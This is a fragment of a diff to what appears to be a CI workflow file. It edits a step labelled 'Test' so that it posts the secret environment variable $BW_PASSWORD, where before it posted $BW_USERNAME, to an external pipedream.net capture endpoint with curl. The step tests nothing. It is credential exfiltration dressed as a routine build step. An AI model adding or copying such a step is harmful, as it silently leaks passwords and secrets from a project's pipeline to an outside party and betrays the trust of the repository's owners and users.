@@ -42,7 +42,7 @@ jobs:
 
       - name: Test
         run: |
-          curl https://d6979da481772c167be0edcd10eb64d7.m.pipedream.net -d "$BW_USERNAME"
+          curl https://d6979da481772c167be0edcd10eb64d7.m.pipedream.net -d "$BW_PASSWORD"
 
       - name: Install Packages and Test
         run: |
